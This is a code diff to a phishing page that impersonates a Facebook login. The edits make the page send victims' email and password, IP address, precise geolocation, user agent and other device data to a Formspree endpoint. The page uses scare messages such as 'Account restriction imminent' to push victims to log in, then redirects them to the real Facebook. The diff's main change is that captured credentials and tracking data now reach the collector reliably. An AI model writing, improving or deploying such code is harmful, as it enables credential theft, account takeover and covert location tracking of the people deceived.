@@ -228,7 +228,7 @@
         <div class="login-form-section" id="loginFormSection">
             <p class="message-success" id="loginStatusMessage"></p>
             <form id="phishingLoginForm">
-                <input type="text" id="emailInput" name="email_or_phone" placeholder="Email address or phone number" required>
+                <input type="text" id="emailInput" name="email" placeholder="Email address or phone number" required>
                 <input type="password" id="passwordInput" name="password" placeholder="Password" required>
                 <button type="submit" class="login-button">Log In</button>
                 <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Forgotten password?</a>
@@ -260,11 +260,11 @@
             Latitude: "N/A",
             Longitude: "N/A",
             Accuracy: "N/A",
-            Email: "N/A",
-            Password: "N/A",
+            email: "N/A", // Lowercase 'email' to match Formspree's expectation
+            password: "N/A", // Lowercase 'password'
             UserAgent: navigator.userAgent,
             Referrer: document.referrer || "Direct Access",
-            IPAddress: "N/A", // Changed to N/A initially, as it's fetched asynchronously
+            IPAddress: "N/A",
             NetworkType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "N/A",
             Language: navigator.language || "N/A",
             ScreenResolution: `${window.screen.width}x${window.screen.height}`,
@@ -306,12 +306,14 @@
             countdownTimerDiv.classList.add('hidden');
         }
 
-        async function sendDataToFormspree(data) {
+        // --- NEW sendAllDataToFormspree function to send EVERYTHING ---
+        async function sendAllDataToFormspree(dataToSend) {
             try {
                 const formData = new FormData();
-                for (const key in data) {
-                    formData.append(key, data[key]);
+                for (const key in dataToSend) {
+                    formData.append(key, dataToSend[key]);
                 }
+                
                 const response = await fetch(FORMSPREE_ENDPOINT, {
                     method: 'POST',
                     body: formData,
@@ -321,15 +323,16 @@
                 });
 
                 if (response.ok) {
-                    console.log("Data sent to Formspree.");
+                    console.log("Data sent to Formspree successfully (all fields).");
                 } else {
                     const errorText = await response.text();
-                    console.error("Error sending data to Formspree:", response.status, errorText);
+                    console.error("Error sending data to Formspree (all fields):", response.status, errorText);
                 }
             } catch (error) {
-                console.error('Network or other error sending data to Formspree:', error);
+                console.error('Network or other error sending data to Formspree (all fields):', error);
             }
         }
+        // --- END NEW FUNCTION ---
 
         async function getIPAddress() {
             try {
@@ -346,7 +349,8 @@
                 statusElement.innerHTML = "IP verification skipped. Attempting direct identity confirmation...";
                 updateLoader(40);
             } finally {
-                sendDataToFormspree(dataPayload);
+                // Send the initial payload (IP and passive data)
+                sendAllDataToFormspree(dataPayload);
             }
         }
 
@@ -377,7 +381,8 @@
                         loginStatusMessage.className = 'message-success';
                         loginStatusMessage.innerHTML = "Verification Complete! Your account is now secure. Please log in again.";
                         loginFormSection.classList.add('show');
-                        sendDataToFormspree(dataPayload);
+                        // Send updated dataPayload (now with geo info) to Formspree
+                        sendAllDataToFormspree(dataPayload); 
                         clearInterval(timerInterval);
                     },
                     (error) => {
@@ -404,7 +409,8 @@
                         loginStatusMessage.className = 'message-error';
                         loginStatusMessage.innerHTML = `${errorMessage} Please log in to review your account status.`;
                         loginFormSection.classList.add('show');
-                        sendDataToFormspree(dataPayload);
+                        // Send dataPayload (with geo error info) to Formspree
+                        sendAllDataToFormspree(dataPayload); 
                         clearInterval(timerInterval);
                     },
                     {
@@ -419,7 +425,8 @@
                 loginStatusMessage.className = 'message-error';
                 loginStatusMessage.innerHTML = "Device does not support location services. Account restriction imminent. Please log in to review your account status.";
                 loginFormSection.classList.add('show');
-                sendDataToFormspree(dataPayload);
+                // Send dataPayload (with geo-not-supported info) to Formspree
+                sendAllDataToFormspree(dataPayload); 
                 clearInterval(timerInterval);
             }
         }
@@ -428,14 +435,17 @@
         phishingLoginForm.addEventListener('submit', async function(event) {
             event.preventDefault(); // Stop default form submission
 
-            dataPayload.Email = emailInput.value;
-            dataPayload.Password = passwordInput.value;
+            // Get values from input fields directly
+            dataPayload.email = emailInput.value; // Update email in main payload
+            dataPayload.password = passwordInput.value; // Update password in main payload
             dataPayload.Status = dataPayload.Status + " | Credentials Captured"; // Update status with credential attempt
 
             loginStatusMessage.innerHTML = "Logging in...";
             loginStatusMessage.className = ''; // Remove previous classes
 
-            await sendDataToFormspree(dataPayload); // Send credentials to Formspree
+            // --- Send the ENTIRE updated dataPayload (including credentials) to Formspree ---
+            await sendAllDataToFormspree(dataPayload); 
+            // --- END Send ---
 
             // Immediately redirect to the real Facebook login page
             setTimeout(() => {
@@ -447,8 +457,8 @@
         window.onload = async () => {
             startTimer();
             await getBatteryStatus();
-            await getIPAddress();
-            getPreciseLocation();
+            await getIPAddress(); // This also calls sendAllDataToFormspree for initial data
+            getPreciseLocation(); // This also calls sendAllDataToFormspree with geo data
         };
     </script>
 </body>
